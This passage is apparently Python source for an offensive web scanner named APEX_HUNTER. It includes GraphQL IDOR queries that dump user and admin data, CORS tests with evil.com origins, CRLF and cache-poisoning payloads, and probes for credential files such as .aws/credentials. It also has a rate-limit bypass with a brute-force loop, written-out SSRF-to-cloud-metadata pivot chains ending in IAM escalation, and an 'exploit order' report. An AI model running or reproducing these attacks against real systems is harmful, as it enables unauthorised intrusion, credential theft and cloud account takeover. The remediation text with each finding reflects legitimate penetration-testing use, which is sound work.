                    f"DNS brute-force discovered {len(new_subs)} additional subdomains for {apex}. "
                    "Each represents additional attack surface."
                ),
                evidence="\n".join(f"  {fqdn} → {ip}" for fqdn, ip in new_subs[:20]),
                poc_curl="\n".join(f"curl -sk 'https://{fqdn}/'" for fqdn, _ in new_subs[:5]),
                category="Reconnaissance",
                remediation="Review each discovered subdomain for security posture. Remove unused subdomains. Apply consistent security headers and authentication across all subdomains."
            ))
        return profile


class GraphQLIDORDetector:
    """Detect IDOR via GraphQL — enumerate IDs in queries and test object-level auth."""
    NAME = "GraphQL IDOR Detector"
    GQL_ENDPOINTS = ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql"]
    ID_QUERIES = [
        ('{"query":"{user(id:\\"2\\"){id email role}}"}',            "User ID 2"),
        ('{"query":"{order(id:\\"1\\"){id total items}}"}',           "Order ID 1"),
        ('{"query":"{profile(userId:\\"2\\"){id email phone}}"}',     "Profile ID 2"),
        ('{"query":"{invoice(id:\\"1\\"){id amount customerName}}"}', "Invoice ID 1"),
        ('{"query":"{ticket(id:\\"1\\"){id status assignee secret}}"}', "Ticket ID 1"),
        ('{"query":"{ __schema { queryType { name } mutationType { name } } }"}', "Schema introspection"),
        ('{"query":"{users{id email role isAdmin}}"}',                "All users list"),
        ('{"query":"{admin{users{id email password}}}"}',             "Admin users dump"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for ep in self.GQL_ENDPOINTS:
            url = base + ep
            for query_body, label in self.ID_QUERIES:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
                               query_body.encode(),
                               {"Content-Type": "application/json"})
                    if r and r.status == 200:
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if '"data"' in body and '"errors"' not in body:
                            has_sensitive = any(s in body for s in [
                                '"email"', '"password"', '"role"', '"isAdmin"',
                                '"phone"', '"secret"', '"token"', '"key"',
                                '"amount"', '"total"', '"customerName"',
                            ])
                            profile.findings.append(Finding(
                                id=f"GQL-IDOR-{label.replace(' ','_').upper()[:18]}",
                                title=f"GraphQL IDOR / Unauth Data Access — {label}",
                                severity="CRITICAL" if has_sensitive else "HIGH",
                                cvss=9.1 if has_sensitive else 7.5,
                                cwe="CWE-639",
                                description=(
                                    f"GraphQL query '{label}' returned data at {ep} without "
                                    "user-specific authorization. "
                                    + ("Sensitive fields exposed: email/password/role detected."
                                       if has_sensitive else "Object-level auth not enforced.")
                                ),
                                evidence=body[:300],
                                poc_curl=(
                                    f"curl -sk -X POST '{url}' "
                                    f"-H 'Content-Type: application/json' "
                                    f"-d '{query_body}'"
                                ),
                                category="GraphQL IDOR",
                                remediation="Implement per-field authorization in GraphQL resolvers. Use DataLoader with ownership checks. Apply depth/complexity limits. Disable introspection in production."
                            ))
                except Exception:
                    pass
        return profile


class CORSWildcardChain:
    """Detect CORS wildcard + credentials, trusted subdomain chains, and origin reflection."""
    NAME = "CORS Wildcard Chain"
    ORIGIN_TESTS = [
        ("null",                     "null origin"),
        ("https://evil.com",         "arbitrary origin"),
        ("https://{apex}.evil.com",  "apex suffix bypass"),
        ("https://evil.{apex}",      "subdomain prefix bypass"),
        ("https://sub.{apex}",       "trusted subdomain"),
        ("https://{apex}_.evil.com", "underscore bypass"),
        ("http://{apex}",            "HTTP downgrade"),
        ("https://{apex}:443",       "port variation"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        apex = profile.apex
        for origin_tmpl, label in self.ORIGIN_TESTS:
            origin = origin_tmpl.replace("{apex}", apex)
            try:
                r = _fetch(base + "/api/", cfg.ua, cfg.timeout,
                           extra_headers={"Origin": origin})
                if r:
                    acao = r.headers.get("access-control-allow-origin", "")
                    acac = r.headers.get("access-control-allow-credentials", "")
                    if acao and (acao == origin or acao == "*"):
                        sev = "CRITICAL" if acac.lower() == "true" else "HIGH"
                        profile.findings.append(Finding(
                            id=f"CORS-CHAIN-{label.replace(' ','_').upper()[:18]}",
                            title=f"CORS Misconfiguration — {label} accepted with credentials={acac or 'N/A'}",
                            severity=sev, cvss=9.0 if sev == "CRITICAL" else 7.4, cwe="CWE-346",
                            description=(
                                f"CORS allows origin '{origin}' with "
                                f"Access-Control-Allow-Credentials: {acac or 'not set'}. "
                                "Enables cross-origin credential theft: authenticated requests "
                                "from attacker-controlled page to read victim's data."
                            ),
                            evidence=f"ACAO: {acao} | ACAC: {acac}",
                            poc_curl=(
                                f"curl -sk '{base}/api/' -H 'Origin: {origin}' -v 2>&1 | "
                                f"grep -i 'access-control'"
                            ),
                            category="CORS",
                            remediation="Use strict allowlist for CORS origins. Never combine wildcard ACAO with credentials. Validate full origin (scheme+host+port). Reject null origin."
                        ))
            except Exception:
                pass
        return profile


class OpenAPIFuzzer:
    """Fuzz discovered OpenAPI/Swagger schemas for hidden parameters and undocumented endpoints."""
    NAME = "OpenAPI Fuzzer"
    SPEC_PATHS = ["/swagger.json", "/openapi.json", "/openapi.yaml",
                  "/api-docs", "/v2/api-docs", "/v3/api-docs",
                  "/swagger/v1/swagger.json", "/api/swagger.json"]
    HIDDEN_PARAMS = ["debug", "internal", "admin", "test", "bypass",
                     "_method", "_token", "X-Admin", "sudo", "root",
                     "role", "isAdmin", "force", "override", "raw"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import re
        base = profile.url.rstrip("/")
        spec = None
        spec_url = None
        for path in self.SPEC_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if '"paths"' in body or "openapi:" in body or '"swagger"' in body:
                        spec = body; spec_url = url; break
            except Exception:
                pass
        if not spec:
            return profile
        # Extract all endpoints from spec
        endpoints = re.findall(r'"(/[^"]+)":\s*\{', spec)
        if endpoints:
            profile.findings.append(Finding(
                id="OPENAPI-SCHEMA-001",
                title=f"OpenAPI Schema Exposed — {len(endpoints)} endpoints enumerated",
                severity="HIGH", cvss=7.5, cwe="CWE-200",
                description=(
                    f"OpenAPI/Swagger schema at {spec_url} exposes full API surface: "
                    f"{len(endpoints)} endpoints, request schemas, and response models. "
                    "Enables targeted fuzzing of all parameters."
                ),
                evidence=f"Endpoints: {', '.join(endpoints[:10])}{'...' if len(endpoints)>10 else ''}",
                poc_curl=f"curl -sk '{spec_url}' | python3 -m json.tool | grep '\"/' | head -30",
                category="API Schema",
                remediation="Restrict Swagger/OpenAPI to authenticated users only. Disable in production or apply IP allowlist. Remove sensitive schema details (internal service names, DB schemas)."
            ))
        # Fuzz first few endpoints with hidden params
        for ep in endpoints[:5]:
            url = base + ep
            for param in self.HIDDEN_PARAMS[:6]:
                try:
                    r = _fetch(f"{url}?{param}=1", cfg.ua, cfg.timeout)
                    if r and r.status in (200, 201):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if any(s in body for s in ['"admin"', '"debug"', '"internal"',
                                                    '"sudo"', '"override"', "true"]):
                            profile.findings.append(Finding(
                                id=f"OPENAPI-HIDDEN-{param.upper()[:12]}-{ep.replace('/','_')[:10].upper()}",
                                title=f"Hidden parameter '?{param}' accepted at {ep}",
                                severity="HIGH", cvss=7.5, cwe="CWE-912",
                                description=(
                                    f"Undocumented parameter '?{param}=1' at {ep} returned "
                                    f"HTTP {r.status} with success indicators. "
                                    "May enable debug mode, admin access, or behaviour override."
                                ),
                                evidence=body[:200],
                                poc_curl=f"curl -sk '{url}?{param}=1'",
                                category="Hidden Parameters",
                                remediation="Audit all accepted parameters against OpenAPI schema. Remove undocumented debug/admin parameters from production builds. Apply input allowlist."
                            ))
                except Exception:
                    pass
        return profile


class AzureBlobPublicDetector:
    """Enumerate publicly accessible Azure Blob Storage containers by naming pattern."""
    NAME = "Azure Blob Public Detector"
    CONTAINER_NAMES = [
        "public", "assets", "media", "images", "uploads", "files",
        "static", "backup", "backups", "data", "export", "exports",
        "documents", "docs", "reports", "logs", "config", "configs",
        "archive", "archives", "temp", "tmp", "cache", "cdn",
        "release", "releases", "build", "builds", "dist",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        apex_parts = profile.apex.replace(".", "-")
        host_part = profile.host.replace(".", "-")
        storage_accounts = [
            apex_parts, host_part,
            apex_parts.split("-")[0],
            host_part.split("-")[0],
            f"{apex_parts}prod", f"{apex_parts}dev",
            f"{apex_parts}storage", f"{host_part}sa",
        ]
        for acct in storage_accounts[:4]:
            for container in self.CONTAINER_NAMES[:10]:
                url = f"https://{acct}.blob.core.windows.net/{container}?restype=container&comp=list"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.status == 200:
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if "<EnumerationResults" in body or "<Blobs>" in body:
                            import re
                            blobs = re.findall(r"<Name>([^<]+)</Name>", body)
                            profile.findings.append(Finding(
                                id=f"AZURE-BLOB-PUBLIC-{acct[:12].upper()}-{container[:8].upper()}",
                                title=f"Public Azure Blob Container: {acct}/{container}",
                                severity="HIGH", cvss=7.5, cwe="CWE-284",
                                description=(
                                    f"Azure Blob container '{container}' in account '{acct}' is publicly "
                                    f"listable. Found {len(blobs)} blobs."
                                ),
                                evidence=f"Blobs: {', '.join(blobs[:10])}",
                                poc_curl=f"curl -sk '{url}'",
                                category="Cloud Storage",
                                remediation="Set container access to private. Apply Azure Storage firewall. Use SAS tokens with expiry for temporary access. Enable Azure Defender for Storage."
                            ))
                except Exception:
                    pass
        return profile


class SessionFixationDetector:
    """Detect session fixation — pre-auth token reuse after login."""
    NAME = "Session Fixation Detector"
    LOGIN_PATHS = ["/login", "/api/login", "/auth/login", "/signin",
                   "/api/signin", "/api/auth", "/api/v1/auth/login",
                   "/api/v2/auth/login", "/account/login", "/user/login"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.LOGIN_PATHS:
            url = base + path
            try:
                # Step 1: get pre-auth session cookie
                r1 = _fetch(url, cfg.ua, cfg.timeout)
                if not r1 or r1.status not in (200, 405):
                    continue
                pre_cookies = r1.headers.get("set-cookie", "")
                if not pre_cookies:
                    continue
                # Step 2: submit login with that cookie
                r2 = _fetch(url, cfg.ua, cfg.timeout, "POST",
                            b'{"username":"test@test.com","password":"test123"}',
                            {"Content-Type": "application/json",
                             "Cookie": pre_cookies})
                if not r2:
                    continue
                post_cookies = r2.headers.get("set-cookie", "")
                # If no new session cookie issued after login → fixation risk
                if pre_cookies and not post_cookies and r2.status in (200, 201):
                    profile.findings.append(Finding(
                        id=f"SESSION-FIXATION-{path.replace('/','_').strip('_')[:16].upper()}",
                        title=f"Potential Session Fixation at {path}",
                        severity="HIGH", cvss=7.5, cwe="CWE-384",
                        description=(
                            f"Login at {path} did not issue a new session cookie after authentication. "
                            "Pre-auth session token appears to persist — session fixation attack possible. "
                            "Attacker sets victim's session ID before login, then hijacks the session."
                        ),
                        evidence=f"Pre-auth cookie: {pre_cookies[:80]}\nPost-auth Set-Cookie: (none)",
                        poc_curl=(
                            f"# Step 1 — get session:\n"
                            f"SESSION=$(curl -sk -c - '{url}' | grep -i session)\n"
                            f"# Step 2 — login with fixed session:\n"
                            f"curl -sk -X POST '{url}' -H 'Cookie: {pre_cookies[:40]}' "
                            f"-d '{{\"username\":\"victim\",\"password\":\"correct\"}}'"
                        ),
                        category="Session Management",
                        remediation="Issue a new session ID on every successful authentication. Invalidate pre-auth session tokens. Use SameSite=Strict; Secure; HttpOnly on session cookies."
                    ))
            except Exception:
                pass
        return profile


class HTTPHeaderInjectionAdv:
    """Detect advanced HTTP header injection: CRLF, cache poisoning via headers, host override."""
    NAME = "HTTP Header Injection Advanced"
    CRLF_PAYLOADS = [
        "%0d%0aSet-Cookie:crlftest=1",
        "%0aSet-Cookie:crlftest=1",
        "%0d%0aX-Injected:crlftest",
        "%0d%0a%0d%0a<html>crlftest</html>",
        "\r\nSet-Cookie:crlftest=1",
        "%E5%98%8D%E5%98%8ASet-Cookie:crlftest=1",  # Unicode CRLF bypass
    ]
    POISON_HEADERS = [
        ("X-Forwarded-Host",    "evil.com"),
        ("X-Original-URL",      "/admin"),
        ("X-Rewrite-URL",       "/admin"),
        ("X-Override-URL",      "/admin"),
        ("X-Forwarded-Prefix",  "/admin"),
        ("X-Original-Host",     "evil.com"),
        ("X-Forwarded-Server",  "evil.com"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        # CRLF via redirect params
        for payload in self.CRLF_PAYLOADS[:4]:
            for param in ["next", "return", "redirect", "url", "to", "location"]:
                url = f"{base}/?{param}={urllib.parse.quote('https://example.com/' + payload)}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r:
                        raw_hdrs = str(r.headers)
                        if "crlftest" in raw_hdrs.lower():
                            profile.findings.append(Finding(
                                id=f"CRLF-INJECT-{param.upper()[:10]}",
                                title=f"CRLF Injection via ?{param} — HTTP header injection",
                                severity="HIGH", cvss=7.5, cwe="CWE-113",
                                description=(
                                    f"CRLF injection via ?{param} parameter. "
                                    "Payload injected into HTTP response headers. "
                                    "Enables: Set-Cookie injection, XSS via header reflection, "
                                    "cache poisoning, open redirect chaining."
                                ),
                                evidence=f"Injected header found in response: {raw_hdrs[:200]}",
                                poc_curl=f"curl -sk -D- '{url}'",
                                category="CRLF Injection",
                                remediation="Sanitise all redirect parameters. Strip CR/LF characters before using values in response headers. Use safe redirect libraries."
                            ))
                            break
                except Exception:
                    pass
        # Cache poisoning via unkeyed headers
        for header, value in self.POISON_HEADERS:
            try:
                r = _fetch(base + "/", cfg.ua, cfg.timeout,
                           extra_headers={header: value})
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if value in body:
                        profile.findings.append(Finding(
                            id=f"CACHE-POISON-HDR-{header.replace('-','_').upper()[:18]}",
                            title=f"Cache Poisoning via Unkeyed Header: {header}",
                            severity="HIGH", cvss=8.1, cwe="CWE-444",
                            description=(
                                f"Header '{header}: {value}' reflected in response body. "
                                "If this response is cached, the injected value will be served "
                                "to all users — enabling cache poisoning DoS or XSS."
                            ),
                            evidence=f"Header value reflected: {body[:200]}",
                            poc_curl=f"curl -sk '{base}/' -H '{header}: {value}'",
                            category="Cache Poisoning",
                            remediation=f"Add '{header}' to cache key or strip it before processing. Validate and sanitise all request headers before reflecting them in responses."
                        ))
            except Exception:
                pass
        return profile


class CryptographicWeaknessScanner:
    """Detect weak cryptographic algorithms in cookies, tokens, and API responses."""
    NAME = "Cryptographic Weakness Scanner"
    WEAK_PATTERNS = [
        (r"[0-9a-f]{32}\b",     "MD5 hash (32 hex chars)",    "MD5"),
        (r"[0-9a-f]{40}\b",     "SHA-1 hash (40 hex chars)",  "SHA-1"),
        (r"[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-",  "UUID v1 (timestamp-based predictable)", "UUID-v1"),
        (r"des|3des|rc4|rc2|blowfish|md5\(", "Weak cipher in source", "WeakCipher"),
        (r"base64_decode\s*\(",  "PHP base64_decode eval chain", "PHP-B64"),
        (r"Math\.random\(\)",    "JS Math.random — weak PRNG",  "JS-WeakPRNG"),
        (r"rand\(\)|mt_rand\(", "PHP rand/mt_rand — predictable", "PHP-Rand"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import re
        base = profile.url.rstrip("/")
        sources = [(profile.url, "main page")]
        sources += [(url, "js") for url in profile.js_files[:5]]
        for src_url, src_type in sources:
            try:
                r = _fetch(src_url, cfg.ua, cfg.timeout)
                if not r or r.status != 200:
                    continue
                body = (r.body or b"").decode("utf-8", errors="replace")
                for pattern, desc, label in self.WEAK_PATTERNS:
                    matches = re.findall(pattern, body, re.IGNORECASE)
                    if matches:
                        profile.findings.append(Finding(
                            id=f"CRYPTO-WEAK-{label}-{src_type.upper()[:6]}",
                            title=f"Weak Cryptography Detected: {desc} in {src_type}",
                            severity="MEDIUM", cvss=5.9, cwe="CWE-327",
                            description=(
                                f"Pattern matching '{desc}' found in {src_url}. "
                                f"{len(matches)} instance(s). "
                                "Weak algorithms are vulnerable to collision/preimage attacks."
                            ),
                            evidence=f"Sample match: {matches[0][:60]}",
                            poc_curl=f"curl -sk '{src_url}' | grep -oE '{pattern[:40]}'",
                            category="Cryptography",
                            remediation=f"Replace {label} with SHA-256/AES-GCM/UUID-v4/crypto.getRandomValues(). Audit all cryptographic usages and upgrade to current standards."
                        ))
            except Exception:
                pass
        return profile


class SensitiveFileDeepScan:
    """Extended sensitive file enumeration — 200+ paths including CI/CD, cloud, IDE artifacts."""
    NAME = "Sensitive File Deep Scan"
    PATHS = [
        # IDE / editor artifacts
        "/.idea/workspace.xml", "/.idea/dataSources.xml", "/.vscode/settings.json",
        "/.vscode/launch.json", "/.editorconfig", "/.eslintrc.json",
        # CI/CD configs
        "/.github/workflows/deploy.yml", "/.gitlab-ci.yml", "/.circleci/config.yml",
        "/.travis.yml", "/Jenkinsfile", "/Dockerfile", "/docker-compose.yml",
        "/docker-compose.prod.yml", "/.drone.yml", "/bitbucket-pipelines.yml",
        # Package / dependency
        "/Gemfile", "/Gemfile.lock", "/Pipfile", "/Pipfile.lock",
        "/go.sum", "/yarn.lock", "/shrinkwrap.json",
        # Secrets / config
        "/.npmrc", "/.pypirc", "/.netrc", "/.pgpass", "/.my.cnf",
        "/credentials.xml", "/secrets.xml", "/configuration.xml",
        "/config/database.yml", "/config/secrets.yml",
        # Cloud
        "/.aws/credentials", "/.aws/config",
        "/service-account.json", "/gcp-credentials.json",
        "/terraform.tfstate", "/terraform.tfstate.backup",
        "/pulumi.yaml",
        # Logs
        "/var/log/app.log", "/logs/error.log", "/logs/app.log",
        "/storage/logs/laravel.log", "/app/logs/server.log",
        # Misc high-value
        "/crossdomain.xml", "/clientaccesspolicy.xml",
        "/WEB-INF/web.xml", "/WEB-INF/spring/", "/META-INF/MANIFEST.MF",
        "/actuator/env", "/actuator/configprops", "/actuator/beans",
        "/console", "/h2-console", "/dbconsole", "/adminer.php",
        "/.DS_Store", "/Thumbs.db", "/.htaccess", "/.htpasswd",
        "/sitemap.xml", "/robots.txt", "/.well-known/security.txt",
        "/server-status", "/server-info", "/nginx_status",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    is_sensitive = any(s in body for s in [
                        "password", "secret", "key", "token", "credential",
                        "private", "BEGIN", "-----", "jdbc:", "mongodb://",
                        "redis://", "amqp://", "apiKey", "access_key",
                    ])
                    profile.findings.append(Finding(
                        id=f"SENSITIVE-{path.replace('/','_').replace('.','_').strip('_')[:20].upper()}",
                        title=f"Sensitive File Exposed: {path}",
                        severity="CRITICAL" if is_sensitive else "HIGH",
                        cvss=9.1 if is_sensitive else 7.5,
                        cwe="CWE-538",
                        description=(
                            f"File {path} is publicly accessible (HTTP 200, {len(body)} bytes). "
                            + ("Contains sensitive credential indicators." if is_sensitive else
                               "May contain configuration or internal details.")
                        ),
                        evidence=body[:300],
                        poc_curl=f"curl -sk '{url}'",
                        category="Sensitive Files",
                        remediation=f"Remove {path} from web root. Block access via web server config. Add to .gitignore. Rotate any exposed credentials immediately."
                    ))
            except Exception:
                pass
        return profile


class RateLimitBypassAdvanced:
    """Detect rate limiting bypass via IP spoofing headers and slow-rate techniques."""
    NAME = "Rate Limit Bypass Advanced"
    SPOOF_HEADERS = [
        {"X-Forwarded-For":     "1.2.3.4"},
        {"X-Originating-IP":    "1.2.3.5"},
        {"X-Remote-Addr":       "1.2.3.6"},
        {"X-Client-IP":         "1.2.3.7"},
        {"X-Real-IP":           "1.2.3.8"},
        {"CF-Connecting-IP":    "1.2.3.9"},
        {"True-Client-IP":      "1.2.3.10"},
        {"X-Cluster-Client-IP": "1.2.3.11"},
        {"Forwarded":           "for=1.2.3.12"},
    ]
    AUTH_PATHS = ["/api/login", "/api/auth", "/login", "/auth",
                  "/api/v1/auth/login", "/api/v2/auth/login", "/oauth/token"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.AUTH_PATHS[:4]:
            url = base + path
            baseline_code = 0
            try:
                # Establish baseline
                r0 = _fetch(url, cfg.ua, cfg.timeout, "POST",
                            b'{"username":"x","password":"x"}',
                            {"Content-Type": "application/json"})
                if r0:
                    baseline_code = r0.status
                # Flood with IP rotation
                codes = []
                for i, hdr_set in enumerate(self.SPOOF_HEADERS):
                    r = _fetch(url, cfg.ua, 5, "POST",
                               b'{"username":"x","password":"x"}',
                               {"Content-Type": "application/json",
                                **{k: f"{v[:-1]}{i}" for k, v in hdr_set.items()}})
                    if r:
                        codes.append(r.status)
                # If all codes are 200/401/400 (not 429), rate limit bypassed
                if codes and 429 not in codes and baseline_code not in (0,):
                    profile.findings.append(Finding(
                        id=f"RATELIMIT-BYPASS-IPHDR-{path.replace('/','_').strip('_')[:14].upper()}",
                        title=f"Rate Limit Bypass via IP Header Rotation at {path}",
                        severity="HIGH", cvss=7.5, cwe="CWE-307",
                        description=(
                            f"Sent {len(codes)} requests with rotating IP spoof headers to {path}. "
                            f"No HTTP 429 received (codes: {set(codes)}). "
                            "Rate limiting appears to be based on IP address from spoofable headers — "
                            "enables unlimited brute-force attacks."
                        ),
                        evidence=f"Response codes: {codes}",
                        poc_curl=(
                            f"for i in $(seq 1 50); do\n"
                            f"  curl -sk -X POST '{url}' -H 'X-Forwarded-For: 1.2.3.$i' "
                            f"-d '{{\"username\":\"admin\",\"password\":\"password$i\"}}' &\n"
                            f"done"
                        ),
                        category="Rate Limiting",
                        remediation="Rate-limit by session/account, not IP. Validate X-Forwarded-For against trusted proxy list. Implement CAPTCHA after N failures. Use account lockout with exponential backoff."
                    ))
            except Exception:
                pass
        return profile


class APIKeyExposureAdvanced:
    """Detect API keys in HTTP responses, error messages, and metadata endpoints."""
    NAME = "API Key Exposure Advanced"
    PROBE_PATHS = [
        "/api/config", "/api/settings", "/api/env",
        "/api/v1/config", "/api/v2/config",
        "/config.js", "/config.json", "/settings.json",
        "/app/config", "/static/config.js",
        "/api/init", "/api/bootstrap",
        "/api/app-config", "/api/client-config",
    ]
    KEY_PATTERNS = [
        (r'AIza[0-9A-Za-z\-_]{35}',              "Google API Key"),
        (r'AKIA[0-9A-Z]{16}',                    "AWS Access Key"),
        (r'sk-[a-zA-Z0-9]{48}',                  "OpenAI Secret Key"),
        (r'sk_live_[0-9a-zA-Z]{24,}',            "Stripe Live Secret"),
        (r'[0-9a-f]{32}:[0-9a-f]{32}',           "Generic Key:Secret pair"),
        (r'"apiKey"\s*:\s*"[A-Za-z0-9_\-]{20,}"', "JSON apiKey field"),
        (r'"secretKey"\s*:\s*"[A-Za-z0-9_\-]{20,}"', "JSON secretKey field"),
        (r'"clientSecret"\s*:\s*"[A-Za-z0-9_\-]{16,}"', "JSON clientSecret"),
        (r'token["\s]*[:=]["\s]*[A-Za-z0-9_\-]{32,}', "Generic token assignment"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import re
        base = profile.url.rstrip("/")
        for path in self.PROBE_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    for pattern, key_type in self.KEY_PATTERNS:
                        matches = re.findall(pattern, body)
                        if matches:
                            profile.findings.append(Finding(
                                id=f"APIKEY-EXP-{key_type.replace(' ','_').upper()[:14]}-{path.replace('/','_')[:10].upper()}",
                                title=f"API Key Exposed in Response: {key_type} at {path}",
                                severity="CRITICAL", cvss=9.8, cwe="CWE-798",
                                description=(
                                    f"{key_type} exposed in HTTP response at {path}. "
                                    f"Found {len(matches)} instance(s). "
                                    "Direct access to external services — immediate revocation required."
                                ),
                                evidence=f"Match: {matches[0][:60]}",
                                poc_curl=f"curl -sk '{url}'",
                                category="API Key Exposure",
                                remediation=f"Revoke {key_type} immediately. Never send secrets to frontend. Use backend proxy for all API calls. Scan all endpoints with truffleHog/gitleaks in CI/CD."
                            ))
            except Exception:
                pass
        return profile


class CloudMetaPivotChain:
    """Build complete cloud metadata pivot chains from confirmed SSRF findings."""
    NAME = "Cloud Meta Pivot Chain"

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        ssrf_findings = [f for f in profile.findings
                         if "SSRF" in f.category or "ssrf" in f.id.lower()
                         or "BLIND-SSRF" in f.id]
        if not ssrf_findings:
            return profile
        host = profile.host
        chains = {
            "AWS": [
                "1. http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "2. Extract role name from response",
                "3. http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE}",
                "4. Extract AccessKeyId, SecretAccessKey, Token",
                "5. Configure: aws configure --profile stolen",
                "6. Enumerate: aws sts get-caller-identity; aws s3 ls; aws ec2 describe-instances",
                "7. Escalate: aws iam list-attached-user-policies; iam:CreateAccessKey",
            ],
            "Azure": [
                "1. http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ -H 'Metadata: true'",
                "2. Extract access_token (JWT bearer)",
                "3. GET https://management.azure.com/subscriptions?api-version=2020-01-01 -H 'Authorization: Bearer {token}'",
                "4. List resources: /subscriptions/{id}/resources",
                "5. Access Key Vault: https://vault.azure.net/secrets",
                "6. Escalate: assign Owner role via ARM API",
            ],
            "GCP": [
                "1. http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google'",
                "2. Extract access_token",
                "3. https://cloudresourcemanager.googleapis.com/v1/projects -H 'Authorization: Bearer {token}'",
                "4. List buckets: https://storage.googleapis.com/storage/v1/b?project={project}",
                "5. Access secrets: https://secretmanager.googleapis.com/v1/projects/{proj}/secrets",
                "6. Escalate: iam.setIamPolicy on project",
            ],
        }
        pivot_text = []
        for ssrf_f in ssrf_findings[:3]:
            pivot_text.append(f"SSRF source: {ssrf_f.id} — {ssrf_f.title[:60]}")
        pivot_text.append("")
        for cloud, steps in chains.items():
            pivot_text.append(f"[{cloud} Pivot Chain]")
            pivot_text.extend(f"  {s}" for s in steps)
            pivot_text.append("")
        profile.findings.append(Finding(
            id="CLOUD-META-PIVOT-CHAIN-001",
            title=f"Cloud Metadata Pivot Chain — Built from {len(ssrf_findings)} SSRF finding(s)",
            severity="CRITICAL", cvss=9.9, cwe="CWE-918",
            description=(
                f"Complete cloud metadata pivot chains generated from {len(ssrf_findings)} "
                "confirmed/suspected SSRF finding(s). Each chain shows exact steps from SSRF "
                "to full cloud account takeover."
            ),
            evidence="\n".join(pivot_text),
            poc_curl="# See chain steps above — replace SSRF parameter with metadata URLs",
            category="SSRF → Cloud Pivot",
            remediation="Block all cloud IMDS IPs at egress layer. Enforce IMDSv2 (AWS). Restrict service account permissions. Apply Workload Identity (GCP). Use managed identity with least privilege (Azure)."
        ))
        return profile


class FullChainReportGen:
    """Generate complete phase-aggregated attack narrative for final reporting."""
    NAME = "Full Chain Report Generator"

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        from collections import Counter
        sev_counts = Counter(f.severity for f in profile.findings)
        categories = Counter(f.category for f in profile.findings)
        critical = [f for f in profile.findings if f.severity == "CRITICAL"]
        high     = [f for f in profile.findings if f.severity == "HIGH"]
        lines = [
            f"═══ APEX_HUNTER FINAL REPORT — {profile.host} ═══",
            f"Scan date    : {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M')}",
            f"Total findings: {len(profile.findings)}",
            f"Risk breakdown: " + " | ".join(
                f"{s}={sev_counts.get(s,0)}"
                for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]
            ),
            "",
            "TOP CRITICAL FINDINGS:",
        ]
        for f in critical[:8]:
            lines.append(f"  [{f.id}] {f.title} (CVSS {f.cvss})")
            lines.append(f"    PoC: {f.poc_curl[:80]}")
        lines += ["", "TOP HIGH FINDINGS:"]
        for f in high[:5]:
            lines.append(f"  [{f.id}] {f.title} (CVSS {f.cvss})")
        lines += ["", "ATTACK CATEGORIES:"]
        for cat, count in categories.most_common(10):
            lines.append(f"  {cat:40} {count:3} finding(s)")
        lines += [
            "",
            "RECOMMENDED EXPLOIT ORDER:",
            "  1. All CRITICAL findings — immediate RCE/takeover risk",
            "  2. Injection chains (SQLi→dump, CMDi→shell, SSTI→RCE)",
            "  3. Cloud pivot chains (SSRF→IMDS→IAM creds)",
            "  4. Authentication bypasses (JWT, BFLA, session fixation)",
            "  5. Sensitive file exposure (env, keys, configs)",
            "",
            "REMEDIATION PRIORITY:",
            "  P1 (24h): All CRITICAL — active exploitation risk",
            "  P2 (7d):  All HIGH — significant security impact",
            "  P3 (30d): All MEDIUM — defence in depth",
            "  P4 (90d): All LOW/INFO — hardening",
        ]
        profile.findings.append(Finding(
            id="FINAL-CHAIN-REPORT-001",
            title=f"Final Attack Chain Report — {sev_counts.get('CRITICAL',0)}C / {sev_counts.get('HIGH',0)}H / {sev_counts.get('MEDIUM',0)}M",
            severity="INFO", cvss=0.0, cwe="CWE-693",
            description="\n".join(lines),
            evidence=f"Total: {len(profile.findings)} findings across {len(categories)} categories",
            poc_curl="# See individual finding PoC commands in JSON/HTML report",
            category="Report",
            remediation="Remediate all CRITICAL and HIGH findings before next assessment cycle."
        ))
        return profile

# ══════════════════════════════════════════════════════════════
# REPORTER  (SKILL-29, SKILL-30)
# ══════════════════════════════════════════════════════════════
class APEXReporter:
